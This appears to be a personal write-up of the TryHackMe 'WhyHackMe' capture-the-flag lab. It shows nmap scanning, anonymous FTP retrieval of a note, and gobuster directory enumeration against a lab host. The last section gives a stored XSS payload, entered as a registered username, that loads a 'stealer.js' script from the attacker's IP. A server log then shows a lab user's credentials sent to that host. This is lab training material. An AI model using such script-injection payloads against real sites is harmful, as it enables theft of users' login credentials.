Link: https://tryhackme.com/room/whyhackme
---
<h1>Service Enumeration</h1>

<b>┌──(duke㉿kali)-[~/Documents/THM_WhyHackMe]<br>
└─$ nmap -sV -sC -Pn 10.10.134.235</B><BR>
<p>Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-08 02:28 CST
<code>Nmap scan report for 10.10.134.235
Host is up (0.039s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.9.30.202
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
|_  256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!!
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.16 seconds</p>
</code>
<b>┌──(duke㉿kali)-[~/Documents/THM_WhyHackMe]<br>
└─$ ftp anonymous@10.10.134.235</b><BR>
<code>
Connected to 10.10.134.235.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||46512|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> get update.txt
local: update.txt remote: update.txt
229 Entering Extended Passive Mode (|||46740|)
150 Opening BINARY mode data connection for update.txt (318 bytes).
100% |**********************************************************************************************************************************************************************************************|   318      169.79 KiB/s    00:00 ETA
226 Transfer complete.
318 bytes received in 00:00 (7.83 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||29466|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||59532|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> exit
421 Timeout.

<B>┌──(duke㉿kali)-[~/Documents/THM_WhyHackMe]<br>
└─$ cat update.txt  </B>

>Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 

┌──(duke㉿kali)-[~/Documents/THM_WhyHackMe]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.134.235 -x .php,.ht
>===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.134.235
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,tx
[+] Timeout:                 10s
===============================================================
2024/01/08 03:00:12 Starting gobuster in directory enumeration mode
===============================================================
/blog.php             (Status: 200) [Size: 3102]
/login.php            (Status: 200) [Size: 523] 
/register.php         (Status: 200) [Size: 643] 
/index.php            (Status: 200) [Size: 563] 
/dir                  (Status: 403) [Size: 278] 
/assets               (Status: 301) [Size: 315] [--> http://10.10.134.235/assets/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]                     
/config.php           (Status: 200) [Size: 0]                                     
/server-status        (Status: 403) [Size: 278] 
---

<h1> web service testing <\h1>

Trying found some XSS or LFI on POST request and found that register.php is vuln via parametr username
register new user: <script src="http://10.X.X.X:8000/stealer.js"></script>     // attacker ip
login by user
run python http server with stealer.js
call script by adding comments on blog page

log from http server
10.10.240.147 - - [11/Jan/2024 03:53:19] "GET /stealer4.js?jack:WhyIsMyPasswordSoStrongIDK HTTP/1.1" 200 -

</code>
